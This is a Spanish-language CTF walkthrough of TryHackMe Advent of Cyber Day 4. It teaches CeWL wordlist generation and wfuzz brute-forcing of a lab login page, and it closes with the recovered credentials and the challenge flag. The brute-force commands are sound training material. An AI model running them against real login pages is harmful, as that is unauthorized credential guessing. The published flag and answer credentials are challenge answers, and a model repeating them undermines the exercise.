# Advent of Cyber Día 4: Brute-forcing

## Introducción

El enunciado comienza contándonos que nuestros protagonistas sufrieron un ataque de fuerza bruta y se hace énfasis en que el atacante logró su cometido muy rápidamente, casi en los primeros intentos. Nos explican que para lograr esto el atacante utilizó una *customized wordlist* y que para generarla utilizó una herramienta especialmente dedicada a eso (CeWL).

## Objetivos de aprendizaje

- Aprender sobre CeWL (se pronuncia "cool")
- Aprender las capacidades de CeWL
- Aprender a generar *custom wordlists* de una página web con CeWL
- Aprender a configurar el output para casos específicos

## CeWL

Es un generador de listados de palabras, el mismo le hace "spider" una página web para crear el listado basándose en los contenidos de la misma. Spidering en el contexto de ciberseguridad refiere al proceso de navegar automáticamente una web y catalogar su contenido, obteniendo su estructura, contenido y otros detalles relevantes. Es una herramienta muy valiosa para penetration testers, ya que encaja perfecto con la estrategia de fuerza bruta. Con el listado de palabras generado se puede hacer brute-forcing a distintas páginas de login.  
Ademas de generar listados de palabras, CeWL también compila una lista de emails y nombres de usuario identificados en los links de la página. Estos valores pueden usarse en el campo de usuario en las operaciones de fuerza bruta.

### Cómo usarlo

Para generar un listado sencillo basta con:

```ps1
cewl http://MACHINE_IP -w output.txt
```

Para ver todas las opciones disponibles:

```ps1
cewl -h
```

### Por qué usarlo

A diferencia de otras herramientas que requieren listas predefinidas o "common dictionary attacks", CeWL crea listados personalizados basados en el contenido de la página web. Ademas:

- **Listados específicos**: los listados generados son hechos específicamente para un contexto concreto (el de la página), por lo que aborda todo el vocabulario y terminología del sitio.
- **Profundidad de la búsqueda**: se puede especificar la profundidad de la búsqueda, extrayendo información no solo de una página, sino también de las páginas que tengan sus links presentes en la página principal.
- **Output personalizable**: CeWL tiene opciones para personalizar el output, algunos ejemplos son: limitar el tamaño de las palabras, quitar los números, incluir *meta tags*, etc.
- **Funcionalidades extra**: ademas de generar los listados de palabras, también es posible enumerar nombres de usuario y extraer direcciones email.
- **Eficiencia**: gracias a su personalización, CeWL permite generar listados pequeños pero mucho más relevantes.
- **Integración**: siendo una aplicación de línea de comandos, es muy simple integrarlo y compartir información con otras herramientas.
- **Activamente mantenido**: recibe actualizaciones constantemente.

### Personalizar el output

#### Profundidad de búsqueda

Supongamos que queremos que la búsqueda tenga 2 links como profundidad:

```ps1
cewl http://MACHINE_IP -d 2 -w output1.txt
```

#### Tamaño mínimo y máximo de las palabras

Supongamos que queremos palabras de entre 5 y 10 caracteres:

```ps1
cewl http://MACHINE_IP -m 5 -x 10 -w output2.txt
```

#### Autenticación

Si la página web objetivo está detrás de un login, se puede usar `-a` para una *form-based authentication*.

#### Extensiones personalizadas

La opción `--with-numbers` le agrega números al final de las palabras y la opción `--extension` le agrega una extensión personalizada.

#### Seguir links externos

Por defecto CeWL no sigue links a sitios externos, para cambiar este comportamiento hay que usar `--offsite`.

## Resolución

Se va a trabajar con la VM de THM. Hay que usar todo lo aprendido para lograr entrar en http://MACHINE_IP/login.php.

![Website](img/1.png)

### Creando un listado de contraseñas

```ps1
cewl -d 2 -m 5 -w passwords.txt http://MACHINE_IP --with-numbers
```

![Output1](img/2.png)

### Creando un listado de usuarios

```ps1
cewl -d 0 -m 5 -w usernames.txt http://10.10.10.158/team.php --lowercase
```

![Output2](img/3.png)

### Fuerza bruta mediante wfuzz

Wfuzz es una herramienta que permite aplicarle fuerza bruta a una aplicación web. Permite encontrar recursos, directorios, scripts, aplicarle fuerza bruta a parámetros de GET y POST, aplicarle fuerza bruta a usuarios y contraseñas y fuzzing.

```ps1
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://MACHINE_IP/login.php -d "username=FUZZ&password=FUZ2Z"
```

Donde:

- `-z file,usernames.txt`: carga los nombres de usuario generados por CeWL
- `-z file,passwords.txt`: carga las contraseñas generadas por CeWL
- `--hs "Please enter the correct credentials"`: oculta las respuestas que contengan el mensaje especificado
- `-u`: especifica la URL del objetivo
- `-d "username=FUZZ&password=FUZ2Z"`: especifica el formato de POST, donde `FUZZ` se reemplaza por los nombres de usuario y `FUZZ2Z`por las contraseñas.

![Output3](img/4.png)

### Respuesta

Utilizando las credenciales obtenidas ingresamos en la página y buscamos la flag. La información que nos pide THM es:

| Información       | Valor                    |
| :---------------- | :----------------------- |
| username:password | isaias:Happiness         |
| flag              | THM{m3rrY4nt4rct1crAft$} |

### [Volver a inicio](../../README.md)
